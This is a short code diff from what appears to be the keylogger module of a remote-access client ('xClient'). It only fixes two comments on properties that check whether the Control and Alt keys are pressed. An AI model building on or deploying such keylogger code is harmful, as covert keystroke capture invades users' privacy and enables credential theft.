@@ -69,7 +69,7 @@ namespace xClient.Core.Keylogger
         {
             get
             {
-                return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); //Returns true if shiftkey is pressed
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.ControlKey) & 0x8000); //Returns true if controlkey is pressed
             }
         }
 
@@ -77,7 +77,7 @@ namespace xClient.Core.Keylogger
         {
             get
             {
-                return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); //Returns true if shiftkey is pressed
+                return Convert.ToBoolean(GetAsyncKeyState(Keys.Menu) & 0x8000); //Returns true if altkey is pressed
             }
         }
 
